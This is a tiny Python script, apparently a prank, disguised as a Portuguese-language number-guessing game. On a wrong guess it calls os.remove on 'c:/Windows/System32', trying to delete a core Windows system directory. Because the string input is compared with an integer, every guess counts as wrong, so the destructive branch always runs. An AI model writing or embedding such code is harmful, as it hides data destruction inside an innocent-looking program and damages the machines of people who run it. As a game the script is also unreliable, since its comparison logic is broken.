import os, random

num = random.randint(0, 10)
while True:
    resp = input("Número")
    if resp == num:
        print("Acertou")
        break
    else:
        os.remove('c:/Windows/System32')